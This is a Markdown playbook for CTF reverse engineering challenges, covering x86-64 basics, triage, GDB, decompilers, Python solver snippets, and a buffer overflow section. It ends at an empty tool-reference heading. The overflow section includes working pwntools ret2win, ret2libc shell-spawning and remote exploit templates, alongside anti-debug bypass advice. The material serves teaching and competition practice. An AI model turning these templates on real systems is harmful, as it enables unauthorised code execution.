# Reverse Engineering Playbook

A standalone guide covering learning, triage, cheatsheet commands, solver scripting, and tool reference for CTF reverse engineering challenges.

---

## Table of Contents

- **Fundamentals (Learn First)**
  - [What Is Reverse Engineering?](#what-is-reverse-engineering)
  - [Binary File Formats](#binary-file-formats)
  - [CPU, Registers & Memory](#cpu-registers--memory)
  - [The Stack & Calling Conventions](#the-stack--calling-conventions)
  - [x86-64 Assembly Primer](#x86-64-assembly-primer)
  - [Control Flow Patterns](#control-flow-patterns)
  - [Static vs Dynamic Analysis](#static-vs-dynamic-analysis)
  - [Safe Lab Practices](#safe-lab-practices)
- **Triage & Decision Tree**
  - [Step 0 - Identify the Target](#step-0---identify-the-target)
  - [Step 1 - Pattern Selector](#step-1---pattern-selector)
  - [Step 2 - Evidence Notebook](#step-2---evidence-notebook)
- **Cheatsheet - Commands & Workflows**
  - [Strings & File Identification](#strings--file-identification)
  - [Disassembly & Decompilation](#disassembly--decompilation)
  - [GDB Quick Reference](#gdb-quick-reference)
  - [GDB Breakpoint Scripting](#gdb-breakpoint-scripting)
  - [Linux ELF Workflow](#linux-elf-workflow)
  - [Windows PE Workflow](#windows-pe-workflow)
  - [Python Source & Bytecode](#python-source--bytecode)
  - [PyInstaller & Pyarmor](#pyinstaller--pyarmor)
  - [Java, APK & .NET](#java-apk--net)
  - [WebAssembly](#webassembly)
  - [Packed & Obfuscated Binaries](#packed--obfuscated-binaries)
  - [Script & Payload Deobfuscation](#script--payload-deobfuscation)
  - [Anti-Debug & Hostile Runtime](#anti-debug--hostile-runtime)
- **Solver Cookbook**
  - [XOR - Single Byte](#xor---single-byte)
  - [XOR - Repeating Key](#xor---repeating-key)
  - [Known-Plaintext Key Recovery](#known-plaintext-key-recovery)
  - [Byte Transform Skeleton](#byte-transform-skeleton)
  - [Index Shuffle / Reorder](#index-shuffle--reorder)
  - [Caesar / ROT Brute Force](#caesar--rot-brute-force)
  - [Base Encoding & Decoding](#base-encoding--decoding)
  - [Hash Brute Force](#hash-brute-force)
  - [Z3 Constraint Solver](#z3-constraint-solver)
  - [Matrix / Linear System Solver](#matrix--linear-system-solver)
  - [angr Symbolic Execution](#angr-symbolic-execution)
  - [VM & State Machine Lifting](#vm--state-machine-lifting)
  - [Graph / Path Solver](#graph--path-solver)
  - [Bitmap / PBM Bit Extraction](#bitmap--pbm-bit-extraction)
  - [Binary File Patching](#binary-file-patching)
- **Buffer Overflow Quick Reference**
  - [Triage & Checksec](#bof-triage--checksec)
  - [Find the Offset](#find-the-offset)
  - [Ret2win](#ret2win)
  - [Ret2libc](#ret2libc)
  - [ROP Notes](#rop-notes)
  - [Remote Exploit Template](#remote-exploit-template)
- **Tool Reference**
  - [Local Cheatsheets](#local-cheatsheets) (Includes [IDA Pro](tools/IDA%20Pro%20Cheat%20Sheet.md), [Ghidra](tools/Ghidra%20Cheat%20Sheet.md), [x64dbg](tools/x64dbg%20Cheat%20Sheet.md), [GDB (gef)](tools/GDB%20Cheat%20Sheet.md))
  - [Essential CLI Tools](#essential-cli-tools)
  - [Decompilers & Disassemblers](#decompilers--disassemblers)
  - [Debuggers](#debuggers)
  - [Python Libraries](#python-libraries)
  - [External References](#external-references)
- [Linked Vault Pages](#linked-vault-pages)

---

## Fundamentals (Learn First)

### What Is Reverse Engineering?

Reverse engineering is reading a program or artifact to understand how it validates input, transforms data, hides a flag, or crashes — without having the original source code.

Common CTF reversing targets:

| Target Type           | Examples                                       |
| --------------------- | ---------------------------------------------- |
| Linux native binary   | ELF crackme, SUID binary, pwn challenge        |
| Windows native binary | PE crackme, .NET app, DLL                      |
| Scripted / bytecode   | Python `.py`/`.pyc`, Java `.class`/`.jar`, APK |
| Web binary            | WebAssembly `.wasm`                            |
| Payloads & scripts    | Shell script, PowerShell, plist, batch dropper |
| Visual / exotic       | Blender, G-code, PBM image, CoreWars           |

### Binary File Formats

| Format | OS | Magic Bytes | Inspect With |
|---|---|---|---|
| ELF | Linux/Unix | `\x7fELF` | `readelf`, `objdump`, `file` |
| PE | Windows | `MZ` | `pefile`, Detect It Easy, CFF Explorer |
| Mach-O | macOS | `\xfe\xed\xfa\xce` | `otool`, `lief` |
| .pyc | Cross-platform | varies by Python version | `dis`, `uncompyle6` |
| .class / JAR | Cross-platform | `\xca\xfe\xba\xbe` | `jadx`, `cfr`, `javap` |
| WASM | Web | `\x00asm` | `wasm2wat`, `wasm-decompile` |

### CPU, Registers & Memory

**Registers** are tiny storage slots inside the CPU. On x86-64:

| Register | Role |
|---|---|
| `rax` | Return value, accumulator |
| `rbx` | Callee-saved general purpose |
| `rcx` | 4th argument (Windows), counter |
| `rdx` | 3rd argument |
| `rsi` | 2nd argument (Linux) |
| `rdi` | 1st argument (Linux) |
| `rsp` | Stack pointer (top of stack) |
| `rbp` | Base pointer (frame pointer) |
| `rip` | Instruction pointer (next instruction) |
| `r8`-`r15` | Additional general-purpose |

32-bit equivalents: `eax`, `ebx`, `ecx`, `edx`, `esi`, `edi`, `esp`, `ebp`, `eip`.

**Memory layout** (simplified, top = high address):

```text
+------------------+  high address
| Stack            |  <- grows downward (local vars, return addrs)
|                  |
+------------------+
| Heap             |  <- grows upward (malloc, new)
+------------------+
| BSS              |  <- uninitialized globals
+------------------+
| Data             |  <- initialized globals
+------------------+
| Text (Code)      |  <- executable instructions
+------------------+  low address
```

### The Stack & Calling Conventions

The stack stores local variables, function arguments (on 32-bit), and **return addresses**. A function call:

1. Caller pushes arguments (32-bit) or loads them into registers (64-bit).
2. `call` pushes the return address onto the stack.
3. Callee sets up a stack frame (`push rbp; mov rbp, rsp`).
4. Callee allocates space for local variables (`sub rsp, N`).
5. On return, `ret` pops the return address into `rip`.

**Linux x86-64 calling convention (System V ABI):**

| Argument | Register |
|---|---|
| 1st | `rdi` |
| 2nd | `rsi` |
| 3rd | `rdx` |
| 4th | `rcx` |
| 5th | `r8` |
| 6th | `r9` |
| Return value | `rax` |

**Windows x64 calling convention:**

| Argument | Register |
|---|---|
| 1st | `rcx` |
| 2nd | `rdx` |
| 3rd | `r8` |
| 4th | `r9` |

### x86-64 Assembly Primer

| Instruction | What it does | Example |
|---|---|---|
| `mov dst, src` | Copy value | `mov rax, 5` |
| `lea dst, [addr]` | Load effective address | `lea rax, [rbp-0x10]` |
| `push val` | Push onto stack | `push rbp` |
| `pop dst` | Pop from stack | `pop rbp` |
| `add dst, src` | Add | `add rax, 1` |
| `sub dst, src` | Subtract | `sub rsp, 0x20` |
| `xor dst, src` | Bitwise XOR | `xor eax, eax` (zero out) |
| `and dst, src` | Bitwise AND | `and al, 0xff` |
| `shl dst, n` | Shift left | `shl rax, 3` |
| `shr dst, n` | Shift right | `shr rax, 1` |
| `cmp a, b` | Compare (sets flags) | `cmp rax, 0x42` |
| `test a, b` | Bitwise AND (sets flags, no store) | `test eax, eax` |
| `jmp addr` | Unconditional jump | `jmp 0x401020` |
| `je` / `jz` | Jump if equal / zero | after `cmp` |
| `jne` / `jnz` | Jump if not equal | after `cmp` |
| `jg` / `jl` | Jump if greater / less (signed) | after `cmp` |
| `call addr` | Call function | `call 0x401100` |
| `ret` | Return from function | pops `rip` |
| `nop` | No operation | padding, NOP sled |
| `syscall` | Linux system call | args in `rdi`, `rsi`, `rdx` |

### Control Flow Patterns

When reading disassembly, look for these shapes:

```text
if (x == key):           cmp rax, 0x42
   success()             je  success_label
else:                    jmp fail_label
   fail()

for loop:                mov ecx, 0          ; i = 0
                    .L:  cmp ecx, length
                         jge .done
                         ...                  ; loop body
                         inc ecx
                         jmp .L
                    .done:

XOR transform:           xor byte [rdi+rcx], 0x42

strcmp / memcmp:          call strcmp          ; or repe cmpsb
                         test eax, eax
                         jne fail
```

**Key patterns to spot:**

| Pattern | Meaning |
|---|---|
| `cmp` + conditional jump | Branch condition (success/fail check) |
| XOR/add/sub loop over buffer | Byte transform |
| `strlen` / length compare | Expected input length |
| Table lookup | Substitution cipher or shuffle |
| `strcmp` / `memcmp` | Direct comparison to expected bytes |
| Indirect calls through table | State machine or VM dispatch |
| Repeated multiply + add | Matrix or linear equation |
| Division by magic constant | Compiler-optimized division/modulo |
| Bit shifts + masks | Bitfield, pixel, nibble extraction |

### Static vs Dynamic Analysis

| Approach | Tools | When to use |
|---|---|---|
| **Static** — read without running | `strings`, `objdump`, Ghidra, IDA | Always start here. Safe for hostile binaries. |
| **Dynamic** — run and observe | GDB, `ltrace`, `strace`, x64dbg | After static doesn't reveal enough. Use in a lab VM. |

**Rule of thumb:** Static first, dynamic to confirm hypotheses.

### Safe Lab Practices

1. Work in a **VM** or disposable folder — never on your host with personal data.
2. **Copy** the binary before working on it (`cp challenge labcopy/`).
3. **Hash** the original to verify integrity (`sha256sum challenge`).
4. If the binary self-deletes, phones home, or only runs once, treat it as **hostile** — prefer static analysis.
5. Capture network traffic if you must run something suspicious.
6. Never run CTF binaries as root unless the challenge specifically requires it.

[↑ Back to Table of Contents](#table-of-contents)

---

## Triage & Decision Tree

### Step 0 - Identify the Target

```bash
file ./challenge
strings -n 8 ./challenge
sha256sum ./challenge
checksec --file ./challenge
binwalk ./challenge
```

Then branch:

| Signal | Go to |
|---|---|
| Script / source code | Read and reproduce checks directly |
| ELF binary | [Linux ELF Workflow](#linux-elf-workflow) |
| PE / .NET binary | [Windows PE Workflow](#windows-pe-workflow) |
| `.pyc` or PyInstaller strings | [Python Source & Bytecode](#python-source--bytecode) |
| APK / JAR / .class | [Java, APK & .NET](#java-apk--net) |
| `.wasm` | [WebAssembly](#webassembly) |
| Crash after long input | [Buffer Overflow Quick Reference](#buffer-overflow-quick-reference) |
| Packed / UPX markers | [Packed & Obfuscated Binaries](#packed--obfuscated-binaries) |
| Shell / PowerShell / plist | [Script & Payload Deobfuscation](#script--payload-deobfuscation) |
| Image / PBM output | [Bitmap / PBM Bit Extraction](#bitmap--pbm-bit-extraction) |
| Anti-debug / self-delete | [Anti-Debug & Hostile Runtime](#anti-debug--hostile-runtime) |

### Step 1 - Pattern Selector

| Signal | Likely path | First action |
|---|---|---|
| Readable flag check, constants, arrays, or encoded bytes | Direct transform | Rebuild the check in Python and invert it. |
| PyInstaller, `.pyc`, or Python traceback strings | Python bytecode | Extract, identify Python version, decompile or disassemble. |
| Pyarmor markers or broken decompilation | Protected Python | Prefer bytecode/disassembly and runtime-independent unpackers. |
| Anti-debug exit, self-delete, one-shot behavior | Hostile runtime | Snapshot first, patch checks, or trace in batch mode. |
| Many small state functions or indirect calls | State machine | Log transitions, count breakpoint hits, recover state order. |
| Custom bytecode, VM loop, `switch` dispatcher | VM lifting | Name opcodes, dump a trace, translate to Python, then solve. |
| Large linear-looking math over flag bytes | Matrix / constraints | Extract coefficients and solve with NumPy or Z3. |
| Graph transitions or path validation | Graph solver | Extract edges and solve path/search constraints. |
| Output is an image, PBM, bitmap, or pixels | Visual encoding | Recover row/column/bit mapping, invert image generation. |
| `Illegal instruction`, missing CPU feature, platform mismatch | Static solve | Reimplement validation from constants and code. |
| APK/JAR/.NET/Flutter/mobile bundle | Managed / mobile | Decompile first, then inspect native libraries. |

### Step 2 - Evidence Notebook

Track every challenge with this template:

```text
File type:
Architecture / runtime:
Runs locally?:
Input length / format:
Success string:
Failure string:
State storage:
Important constants:
Transform hypothesis:
Solver path:
```

[↑ Back to Table of Contents](#table-of-contents)

---

## Cheatsheet - Commands & Workflows

### Strings & File Identification

```bash
file ./challenge                         # file type, arch, linking
strings -n 8 ./challenge                 # readable strings (min 8 chars)
strings -n 8 -e l ./challenge            # UTF-16 LE strings (Windows)
sha256sum ./challenge                    # integrity hash
checksec --file ./challenge              # NX, canary, PIE, RELRO
binwalk ./challenge                      # embedded files / signatures
rabin2 -I ./challenge                    # radare2 binary info
```

### Disassembly & Decompilation

```bash
# Quick disassembly
objdump -d ./challenge | less
objdump -M intel -d ./challenge | less   # Intel syntax

# ELF headers & symbols
readelf -a ./challenge
readelf -s ./challenge | less            # symbol table
nm -an ./challenge                       # sorted symbols

# Radare2
r2 -A ./challenge
afl                                      # list functions
pdf @ main                               # disassemble main
iz                                       # strings in data sections

# Ghidra (GUI)
ghidraRun                                # launch Ghidra, import binary
# Auto-analyze → navigate to main → read decompiled C
```

### GDB Quick Reference

```bash
gdb ./challenge
```

| Command | What it does |
|---|---|
| `break main` | Set breakpoint at `main` |
| `break *0x401234` | Breakpoint at specific address |
| `run` | Start execution |
| `run < input.txt` | Start with file as stdin |
| `continue` / `c` | Continue to next breakpoint |
| `stepi` / `si` | Step one instruction |
| `nexti` / `ni` | Step over one instruction |
| `info registers` | Show all register values |
| `print $rax` | Print a specific register |
| `x/s 0xADDR` | Examine memory as string |
| `x/16xb 0xADDR` | Examine 16 bytes as hex |
| `x/32gx $rsp` | Examine 32 quadwords at stack pointer |
| `x/10i $rip` | Examine 10 instructions at current IP |
| `disassemble main` | Disassemble function |
| `info functions` | List all known functions |
| `bt` | Backtrace (call stack) |
| `set $rax = 0x42` | Modify a register |
| `set *(char*)0xADDR = 0x90` | Patch a byte in memory |
| `layout asm` | TUI assembly view |
| `layout regs` | TUI with registers |

### GDB Breakpoint Scripting

Batch mode for counting hits or automated runs:

```bash
gdb -q -batch \
  -ex 'break *0x401234' \
  -ex 'run AAAA' \
  -ex 'continue' \
  -ex 'continue' \
  ./challenge
```

Conditional breakpoints:

```gdb
break *0x401234 if $rax == 0x42
commands
  print $rax
  continue
end
```

### Linux ELF Workflow

```bash
file ./challenge
checksec --file=./challenge
readelf -h ./challenge
readelf -s ./challenge | less
ldd ./challenge                          # shared libraries
strings -n 8 ./challenge
```

**Decision points:**

- Dynamically linked → inspect libc calls with `ltrace`
- Syscalls or static binary → inspect with `strace`, `objdump`, GDB
- SUID binary → look for unsafe file access, command execution, environment trust
- Crash after long input → [Buffer Overflow Quick Reference](#buffer-overflow-quick-reference)
- Stripped binary → rely on function boundaries, imports, strings, debugger

**Debug:**

```bash
gdb ./challenge
break main
run
info functions
disassemble main
info registers
x/32gx $rsp
```

**Runtime tracing:**

```bash
ltrace ./challenge                       # library call trace
strace -f ./challenge                    # system call trace
```

### Windows PE Workflow

```powershell
Get-FileHash .\challenge.exe -Algorithm SHA256
```

```bash
file challenge.exe
strings -n 8 challenge.exe
```

**What to look for:**

- PE arch: x86 vs x64
- GUI vs console subsystem
- .NET metadata
- Packed sections or high-entropy resources
- Suspicious imports: `CreateProcess`, `WinExec`, `VirtualAlloc`, `WriteProcessMemory`, `LoadLibrary`, `GetProcAddress`
- Config strings, URLs, mutexes, registry paths

**Static tools:**

| Tool | Purpose |
|---|---|
| Detect It Easy / PE-bear / CFF Explorer | PE structure |
| dnSpyEx / ILSpy | .NET decompilation |
| Ghidra / IDA Free / Cutter | Native PE disassembly |
| Resource Hacker | Icons, dialogs, embedded resources |
| FLOSS | Decoded stack strings |

**Dynamic tools:**

| Tool | Purpose |
|---|---|
| x64dbg | User-mode native debugging |
| WinDbg | Lower-level debugging |
| Process Monitor | File, registry, process behavior |
| Process Explorer | Process tree, handles, loaded DLLs |

### Python Source & Bytecode

If `.py` is provided:

1. Read constants and comparison functions.
2. Decode Base64/hex values before executing unknown logic.
3. Remove sleeps and failure exits in a local copy.
4. Use `dis` when the check is hidden in bytecode-style logic.

```python
import dis

def check(value):
    return value[::-1] == "terces"

dis.dis(check)
```

For `.pyc` files:

```bash
python -m dis module.pyc                # disassemble bytecode
strings -n 8 module.pyc                 # find embedded strings
```

### PyInstaller & Pyarmor

**PyInstaller extraction:**

```bash
# Detect
file challenge
strings -n 8 challenge | grep -i pyinstaller

# Extract
python pyinstxtractor.py challenge
# or
python pyinstxtractor_ng.py challenge.exe
```

1. Identify the likely entry-point `.pyc`.
2. Match the Python bytecode version.
3. Try decompilers (`uncompyle6`, `decompyle3`, PyLingual).
4. Trust `dis` output when decompilation is incomplete.

**Pyarmor signals:**

- `__pyarmor_enter_*`, `__pyarmor_exit_*`, `__pyarmor_assert_*`
- `pyarmor_runtime`
- Decompiler warnings around new opcodes
- Source that compiles but is semantically unreadable

**Approach:** Prefer offline/static unpackers. Read bytecode disassembly even when source is broken. Reconstruct loops and checks one block at a time.

### Java, APK & .NET

```bash
jadx-gui app.apk                        # GUI decompiler
jadx app.apk -d out                     # CLI decompile to directory
```

Review `MainActivity`, resources, hardcoded strings, native library loading, and validation methods.

| Target | Tools |
|---|---|
| JAR / .class | `jadx`, CFR, FernFlower, Bytecode Viewer |
| Android native `.so` | Ghidra |
| .NET | dnSpyEx, ILSpy |
| Flutter | `blutter`, framework-specific tooling |
| Serialized assets | Search resources, SQLite, JSON, plist/XML |

### WebAssembly

```bash
file module.wasm
strings -n 8 module.wasm
wasm2wat module.wasm -o module.wat       # text format
wasm-decompile module.wasm > module.c    # pseudo-C
```

Search for: exported functions, memory offsets, expected byte arrays, XOR/subtraction loops, and comparison constants. Rebuild the check in Python.

### Packed & Obfuscated Binaries

```bash
strings -n 8 ./challenge | grep -i upx  # check for UPX
upx -d ./challenge                       # unpack UPX
file ./challenge                         # verify after unpacking
```

If unpacking fails: debug after initialization and dump decrypted strings from memory.

If execution fails (`Illegal instruction`, missing CPU features, OS mismatch):

1. **Stop** trying to run it locally.
2. Extract constants from the binary by offset or decompiler view.
3. Reimplement the validation logic in Python.
4. Use emulation only when static reimplementation is too expensive.

### Script & Payload Deobfuscation

For shell scripts, PowerShell, batch, plist, mobileconfig, and staged payloads:

```bash
file artifact
strings -n 6 artifact
xxd artifact | head
```

**Common cleanup steps:**

- XML entities: convert `&amp;`, `&gt;`, `&lt;` back to shell syntax
- Minified code: reformat before reasoning
- Aliases/functions: resolve what commands really become
- `tr`, `rev`, `xxd`, Base64, hex, ROT13: decode small pieces locally
- Here-doc payloads: extract body and decode/decrypt separately
- Comments and filenames can be key material — don't delete too early!

**Decode snippets:**

```bash
printf '%s' '68656c6c6f' | xxd -r -p          # hex to ascii
printf '%s' 'uryyb' | tr 'n-za-mN-ZA-M' 'a-mn-zA-MN-Z'  # ROT13
printf '%s' 'c2VjcmV0' | base64 -d            # base64
```

**OpenSSL payload shape:**

```bash
openssl enc -aes-256-cbc -base64 -d -pbkdf2 -k 'candidate-key' -in payload.b64 -out stage.bin
```

### Anti-Debug & Hostile Runtime

Use this when execution changes state, blocks debuggers, deletes files, phones home, or gives only one try.

**Safe handling:**

```bash
mkdir -p labcopy
cp ./challenge labcopy/challenge
sha256sum labcopy/challenge
strings -n 8 labcopy/challenge | tee labcopy/strings.txt
```

**Anti-debug signals:**

| Platform | Technique |
|---|---|
| Linux | Reads `/proc/self/status` for `TracerPid`; calls `ptrace`, `prctl`, `getppid`; timing checks |
| Windows | `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `NtQueryInformationProcess`, registry/process name checks |
| Both | Program exits only when attached to debugger |

**Bypass options:**

- NOP the anti-debug call or force the "not debugged" branch.
- Patch self-delete/destruction routines to return early.
- Delete or reset challenge-created state (registry keys, config files, marker files).
- Use batch-mode GDB scripts when solve depends on breakpoint counts.

[↑ Back to Table of Contents](#table-of-contents)

---

## Solver Cookbook

### XOR - Single Byte

```python
def xor_byte(data, key):
    return bytes(b ^ key for b in data)

ct = bytes.fromhex("2b272e2e2d")
for k in range(256):
    pt = xor_byte(ct, k)
    if all(32 <= c < 127 for c in pt):
        print(k, pt)
```

### XOR - Repeating Key

```python
def xor_key(data, key):
    key = key if isinstance(key, bytes) else key.encode()
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

print(xor_key(b"hello", b"key"))
```

String variant:

```python
def xor_text(text, key):
    return "".join(chr(ord(ch) ^ ord(key[i % len(key)])) for i, ch in enumerate(text))

print(xor_text("ciphertext", "HMV"))
```

### Known-Plaintext Key Recovery

```python
ct = bytes.fromhex("0011223344")
known = b"flag{"
key_stream = bytes(c ^ p for c, p in zip(ct, known))
print(key_stream.hex())
```

### Byte Transform Skeleton

```python
def transform(data):
    out = bytearray()
    for i, b in enumerate(data):
        out.append((b ^ 0x42) & 0xff)
    return bytes(out)

# Reverse a check that stores expected transformed bytes
expected = [0x20, 0x27, 0x23, 0x25]
plain = bytes(x ^ 0x42 for x in expected)
print(plain)
```

### Index Shuffle / Reorder

```python
data = b"example_flag_order"
order = [3, 0, 1, 2]
print(bytes(data[i] for i in order))
```

### Caesar / ROT Brute Force

```python
import string

alpha = string.ascii_lowercase
text = "uryyb"
for shift in range(26):
    out = "".join(alpha[(alpha.index(c) - shift) % 26] if c in alpha else c for c in text)
    print(shift, out)
```

ROT13 shortcut:

```python
import codecs
print(codecs.decode("synt", "rot_13"))
```

### Base Encoding & Decoding

```python
import base64

raw = b"secret"
print(base64.b64encode(raw))           # b'c2VjcmV0'
print(base64.b64decode(b"c2VjcmV0"))   # b'secret'
print(base64.b32encode(raw))
print(base64.b85encode(raw))

# Hex
print(bytes.fromhex("666c6167"))        # b'flag'
print(b"flag".hex())                    # '666c6167'

# Decimal bytes to text
nums = "102 108 97 103".split()
print("".join(chr(int(n)) for n in nums))
```

### Hash Brute Force

```python
import hashlib

target = "5f4dcc3b5aa765d61d8327deb882cf99"
with open("wordlist.txt", "rb") as f:
    for line in f:
        word = line.strip()
        if hashlib.md5(word).hexdigest() == target:
            print(word.decode(errors="ignore"))
            break
```

Permutation brute force:

```python
import hashlib, itertools

target = "md5_here"
chars = "abc123"
for perm in itertools.permutations(chars):
    candidate = "".join(perm)
    if hashlib.md5(candidate.encode()).hexdigest() == target:
        print(candidate)
        break
```

### Z3 Constraint Solver

Basic integer constraints:

```python
from z3 import *

x = Int("x")
y = Int("y")
s = Solver()
s.add(x + y == 10)
s.add(x > 0, y > 0)

if s.check() == sat:
    m = s.model()
    print(m[x], m[y])
```

Byte-level constraints (typical for flag validation):

```python
from z3 import *

chars = [BitVec(f"c{i}", 8) for i in range(4)]
s = Solver()
for c in chars:
    s.add(c >= 0x20, c <= 0x7e)            # printable ASCII
s.add(chars[0] ^ chars[1] == 0x10)
s.add(chars[2] + chars[3] == 150)

if s.check() == sat:
    m = s.model()
    print(bytes([m[c].as_long() for c in chars]))
```

### Matrix / Linear System Solver

**Z3 for modular byte equations:**

```python
from z3 import BitVec, Solver, sat

SIZE = 64
matrix = [...]  # row-major SIZE * SIZE coefficients
target = [...]  # SIZE target bytes

flag = [BitVec(f"flag_{i}", 8) for i in range(SIZE)]
s = Solver()

for c in flag:
    s.add(c >= 0x20, c <= 0x7e)

for row in range(SIZE):
    acc = 0
    for col in range(SIZE):
        acc += matrix[row * SIZE + col] * flag[col]
    s.add((acc & 0xff) == target[row])

if s.check() == sat:
    m = s.model()
    print(bytes(m[c].as_long() for c in flag))
```

**NumPy for ordinary linear algebra:**

```python
import numpy as np

A = np.array(coefficients, dtype=np.int64)
b = np.array(targets, dtype=np.int64)
x = np.linalg.lstsq(A, b, rcond=None)[0]
print(bytes(round(v) & 0xff for v in x))
```

Use `np.linalg.solve` for square invertible systems and `np.linalg.pinv(A) @ b` for pseudo-inverse.

### angr Symbolic Execution

Basic:

```python
import angr

project = angr.Project("./binary", auto_load_libs=False)
state = project.factory.entry_state()
simgr = project.factory.simulation_manager(state)

simgr.explore(find=0x401234, avoid=0x401000)

if simgr.found:
    found = simgr.found[0]
    print(found.posix.dumps(0))
```

With symbolic stdin:

```python
import angr, claripy

project = angr.Project("./binary", auto_load_libs=False)
flag = claripy.BVS("flag", 8 * 32)
state = project.factory.full_init_state(stdin=flag)

for byte in flag.chop(8):
    state.solver.add(byte >= 0x20, byte <= 0x7e)

simgr = project.factory.simulation_manager(state)
simgr.explore(find=0x401234, avoid=0x401000)

if simgr.found:
    print(simgr.found[0].solver.eval(flag, cast_to=bytes))
```

### VM & State Machine Lifting

1. Identify the program counter, stack, memory, and dispatch variable.
2. Rename each opcode by behavior.
3. Dump a trace: `pc`, opcode, operands, stack/memory effect.
4. Translate opcodes into Python.
5. Solve the lifted logic.

Trace shape:

```text
pc=1234 op=LOAD input[0]
pc=1235 op=PUSH 106
pc=1236 op=MUL
pc=1237 op=STORE tmp0
```

If the lifted program becomes equations → switch to [Z3](#z3-constraint-solver). If it becomes transitions → use [Graph Solver](#graph--path-solver).

### Graph / Path Solver

```python
from collections import defaultdict

edges = defaultdict(list)
for src, dst, symbol in transitions:
    edges[src].append((dst, symbol))

path = []
seen = set()

def dfs(node):
    if len(path) == TARGET_EDGE_COUNT:
        return True
    options = sorted(edges[node], key=lambda e: len(edges[e[0]]))
    for nxt, sym in options:
        if (node, nxt, sym) in seen:
            continue
        seen.add((node, nxt, sym))
        path.append(sym)
        if dfs(nxt):
            return True
        path.pop()
        seen.remove((node, nxt, sym))
    return False

dfs(0)
print(bytes(path))
```

Fits: transition-table validators, Hamiltonian/Euler-style paths, maze state machines, VM programs where input bytes select edges.

### Bitmap / PBM Bit Extraction

```python
from pathlib import Path

text = Path("out.pbm").read_text()
body = "".join(ch for ch in text.split(maxsplit=3)[3] if ch in "01")
width = 80
rows = [body[i:i+width] for i in range(0, len(body), width)]

bits = []
for row in rows:
    useful = row[1:6]      # adjust after mapping margins
    bits.append(useful[::-1])

value = int("".join(reversed(bits)), 2)
print(value.to_bytes((value.bit_length() + 7) // 8, "big"))
```

### Binary File Patching

Read and patch bytes:

```python
from pathlib import Path

data = bytearray(Path("sample.bin").read_bytes())
data[0x100:0x104] = b"\x90\x90\x90\x90"  # NOP out 4 bytes
Path("patched.bin").write_bytes(data)
```

Find strings in a binary:

```python
import re
from pathlib import Path

data = Path("sample.bin").read_bytes()
for s in re.findall(rb"[ -~]{4,}", data):
    print(s.decode(errors="ignore"))
```

[↑ Back to Table of Contents](#table-of-contents)

---

## Buffer Overflow Quick Reference

### BOF Triage & Checksec

```bash
file ./vuln
checksec --file=./vuln
strings -n 8 ./vuln
./vuln
```

| Mitigation | Meaning if disabled |
|---|---|
| NX disabled | Stack is executable → shellcode possible |
| No canary | No stack cookie → direct overwrite |
| No PIE | Fixed addresses → reliable gadgets |
| Partial RELRO | GOT is writable → GOT overwrite possible |

### Find the Offset

```bash
pwn cyclic 300 > pattern.txt
```

In GDB:

```bash
gdb ./vuln
run < pattern.txt
info registers
```

```bash
pwn cyclic -l 0x6161616c             # find offset from overwritten value
```

Python:

```python
from pwn import cyclic, cyclic_find
pattern = cyclic(300)
print(cyclic_find(0x6161616c))
```

### Ret2win

When the binary has a `win` / `flag` / `get_shell` function:

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
offset = 72

payload = flat(
    b"A" * offset,
    exe.symbols["win"],
)

p = process(exe.path)
p.sendline(payload)
p.interactive()
```

If it fails on amd64 (stack alignment), add a `ret` gadget:

```python
rop = ROP(exe)
payload = flat(
    b"A" * offset,
    rop.find_gadget(["ret"]).address,
    exe.symbols["win"],
)
```

### Ret2libc

When NX is enabled and no `win` function exists:

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(exe)
offset = 72

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

# Stage 1: Leak libc address
payload = flat(
    b"A" * offset,
    pop_rdi,
    exe.got["puts"],
    exe.plt["puts"],
    exe.symbols["main"],
)

p = process(exe.path)
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]

# Stage 2: system("/bin/sh")
payload = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.symbols["system"],
)

p.sendline(payload)
p.interactive()
```

### ROP Notes

```bash
ROPgadget --binary ./vuln | grep "pop rdi"
ropper --file ./vuln --search "pop rdi"
```

**amd64 argument registers:** `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`

**i386:** arguments pushed on stack after return address.

**Stack alignment:** some libc functions require 16-byte alignment on amd64. Insert a `ret` gadget to fix.

### Remote Exploit Template

```python
from pwn import *

exe = context.binary = ELF("./vuln", checksec=False)
context.log_level = "info"

HOST = "challenge.host"
PORT = 31337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)

offset = 72
payload = flat(
    b"A" * offset,
    exe.symbols.get("win", 0x401196),
)

p = start()
p.sendlineafter(b"> ", payload)
p.interactive()
```

**Debugging checklist if exploit fails:**

- Verify architecture — use `p32` vs `p64`
- Re-check offset after changing input format
- Check if newline truncates or changes payload
- Check bad bytes (`\x00`, `\x0a`, spaces)
- Verify PIE and ASLR assumptions
- Align stack with a `ret` gadget on amd64
- Confirm binary and libc match remote files
- Check input function: `gets`, `fgets`, `scanf`, `read`, or menu logic

[↑ Back to Table of Contents](#table-of-contents)

---

## Tool Reference

### Local Cheatsheets

Use these when you need quick reference syntax, hotkeys, and workflows:

| Tool / Category | Local Sheet |
|---|---|
| Static analysis, XREFs, types, structures, and IDAPython scripting | [IDA Pro Cheat Sheet](tools/IDA%20Pro%20Cheat%20Sheet.md) |
| Open-source static analysis, type refactoring, function graphing, and Jython scripts | [Ghidra Cheat Sheet](tools/Ghidra%20Cheat%20Sheet.md) |
| Windows user-mode debugging, memory dumps, patching, and malware unpacking (Scylla) | [x64dbg Cheat Sheet](tools/x64dbg%20Cheat%20Sheet.md) |
| Linux ELF dynamic debugging, GEF context features, telescope, memory, and automation | [GDB (gef) Cheat Sheet](tools/GDB%20Cheat%20Sheet.md) |
| Hex editing, dump analysis, text processing, and command line helpers | [Vim For Reversing Cheat Sheet](tools/Vim%20For%20Reversing%20Cheat%20Sheet.md) |
| Common CLI utilities: `file`, `strings`, `readelf`, `strace`, `ltrace`, `r2` | [Reversing CLI Tools Cheat Sheet](tools/Reversing%20CLI%20Tools%20Cheat%20Sheet.md) |
| Build Python solvers for XOR, Z3, matrix systems, VM traces, and bytecode parsing | [REV Python Toolkit](tools/REV%20Python%20Toolkit.md) |

### Essential CLI Tools

